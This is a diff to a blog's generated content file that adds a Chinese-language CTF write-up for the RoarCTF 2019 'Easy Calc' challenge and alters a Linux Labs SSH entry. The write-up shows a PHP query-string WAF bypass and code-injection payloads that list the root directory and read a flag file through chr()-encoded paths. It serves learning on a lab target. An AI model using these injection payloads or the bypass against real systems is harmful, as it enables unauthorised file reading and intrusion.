@@ -1416,7 +1416,7 @@ echo $c;
     <content><![CDATA[<h2 id="Linux-Labs"><a href="#Linux-Labs" class="headerlink" title="Linux Labs"></a>Linux Labs</h2><p><img src="/2021/05/12/buu/buuctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(144).png"></p>
 <p>打开靶机后提示连接</p>
 <p>指令格式 ssh -p port</p>
-<p>根据题目提示，输入 ssh -p  27891 <a href="mailto:&#114;&#111;&#x6f;&#116;&#64;&#x6e;&#111;&#100;&#101;&#x33;&#x2e;&#x62;&#117;&#x75;&#x6f;&#x6a;&#x2e;&#99;&#110;">&#114;&#111;&#x6f;&#116;&#64;&#x6e;&#111;&#100;&#101;&#x33;&#x2e;&#x62;&#117;&#x75;&#x6f;&#x6a;&#x2e;&#99;&#110;</a></p>
+<p>根据题目提示，输入 ssh -p  27891 <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#110;&#x6f;&#100;&#x65;&#51;&#46;&#x62;&#117;&#x75;&#x6f;&#106;&#x2e;&#x63;&#x6e;">&#114;&#x6f;&#x6f;&#x74;&#x40;&#110;&#x6f;&#100;&#x65;&#51;&#46;&#x62;&#117;&#x75;&#x6f;&#106;&#x2e;&#x63;&#x6e;</a></p>
 <p>密码：123456</p>
 <h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>打开容器页面后</p>
 <p>出现三份.txt</p>
@@ -1476,6 +1476,36 @@ echo $c;
 <p><img src="/2021/05/12/buu/buuctf/image-20210513231549694.png" alt="image-20210513231549694"></p>
 <p><img src="/2021/05/12/buu/buuctf/image-20210513231603829.png" alt="image-20210513231603829"></p>
 <p>参照博客：<a href="https://blog.csdn.net/xiayu729100940/article/details/105048826">https://blog.csdn.net/xiayu729100940/article/details/105048826</a></p>
+<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>打开后尝试了多次计算器应该只有简单计算功能</p>
+<p>不是什么sql注入，所以查看源码</p>
+<p><img src="/2021/05/12/buu/buuctf/image-20210517163046028.png" alt="image-20210517163046028"></p>
+<p>得到提示  </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url:&quot;calc.php?num&#x3D;&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br></pre></td></tr></table></figure>
+
+<p>hackbar走起</p>
+<p><img src="/2021/05/12/buu/buuctf/image-20210517163339301.png" alt="image-20210517163339301"></p>
+<p>发现源代码，有存在过滤</p>
+<p><img src="/2021/05/12/buu/buuctf/image-20210517163514707.png" alt="image-20210517163514707"></p>
+<p>对数字不感冒，但是一增加字母就无法访问，所以需要绕过</p>
+<p>查了wp[BUUCTF | <a href="https://www.cnblogs.com/chrysanthemum/p/11757363.html">RoarCTF 2019]Easy Calc - !ao!ao - 博客园 (cnblogs.com)</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--$(&quot;#content&quot;).val() 是什么意思：--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--获取id为content的HTML标签元素的值,是JQuery,   (&quot;#content&quot;)相当于document.getElementById(&quot;content&quot;);(&quot;#content&quot;)相当于document.getElementById(&quot;content&quot;);(&quot;#content&quot;).val()相当于 document.getElementById(&quot;content&quot;).value;--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--但是无论怎么注入都是400,403和500，这里用的是一个新的点：PHP的字符串解析特性--&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">? num&#x3D;1;var_dump(scandir(chr(47))) </span><br></pre></td></tr></table></figure>
+
+<p>这里先进行查询，注意这边num前加空格，不然会报错</p>
+<p>大佬的理解：[(3条消息) <a href="https://blog.csdn.net/weixin_44077544/article/details/102630714">RoarCTF 2019]Easy Calc_沐目的博客-CSDN博客</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--假如waf不允许num变量传递字母：--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--http:&#x2F;&#x2F;www.xxx.com&#x2F;index.php?num &#x3D; aaaa   &#x2F;&#x2F;显示非法输入的话--&gt;</span><br><span class="line">&lt;!--1--&gt;</span><br><span class="line">&lt;!--那么我们可以在num前加个空格：--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--http:&#x2F;&#x2F;www.xxx.com&#x2F;index.php? num &#x3D; aaaa--&gt;</span><br><span class="line">&lt;!--1--&gt;</span><br><span class="line">&lt;!--这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功查询<img src="/2021/05/12/buu/buuctf/image-20210517164118854.png" alt="image-20210517164118854"></p>
+<p>成功查询<img src="/2021/05/12/buu/buuctf/image-20210517164118854.png" alt="image-20210517164118854"></p>
+<p>接下来就是构造payload了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calc.php? num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
+
+<p>这个还不太理解，不过应该是调用函数再ASCII码</p>
+<p>得到flag</p>
+<p><img src="/2021/05/12/buu/buuctf/image-20210517164258180.png" alt="image-20210517164258180"></p>
 ]]></content>
       <tags>
         <tag>BUU-CTF</tag>
